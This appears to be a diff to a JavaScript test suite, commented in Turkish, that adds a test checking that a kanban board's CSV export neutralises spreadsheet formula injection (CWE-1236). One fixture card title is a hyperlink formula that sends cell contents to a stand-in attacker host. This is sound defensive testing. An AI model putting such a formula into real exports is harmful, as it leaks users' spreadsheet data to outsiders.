@@ -244,6 +244,25 @@ describe("boardToCsv", () => {
     const satirlar = boardToCsv(ornekBoard()).split("\r\n");
     expect(satirlar).toHaveLength(4); // baslik + 3 kart
   });
+
+  it("formul enjeksiyonuna acik basliklarin basina tek tirnak ekler (CWE-1236)", () => {
+    // Kart basligi tamamen kullanici kontrolunde. "=", "+", "-", "@" ile
+    // baslayan bir hucre Excel/Sheets tarafindan formul sanilip calistirilabilir
+    // (orn. =HYPERLINK ile veri sizdirma) - CSV disari aktarilinca bu tehlikeli.
+    const board = ornekBoard();
+    board.tasks.t1.title = '=HYPERLINK("http://evil.example/"&A1,"tikla")';
+    board.tasks.t2.title = "+1+1";
+    board.tasks.t3.title = "@SUM(1,2)";
+    board.tasks.t3.description = "-2+3";
+
+    const csv = boardToCsv(board);
+    expect(csv).toContain("'=HYPERLINK");
+    expect(csv).toContain("'+1+1");
+    expect(csv).toContain("'@SUM");
+    expect(csv).toContain("'-2+3");
+    // Formul tetikleyicisiyle BASLAMAYAN degerler (orn. atanan adi) degismeden kalmali
+    expect(csv).toContain("Mert Şafak");
+  });
 });
 
 describe("dosyaAdiUret", () => {
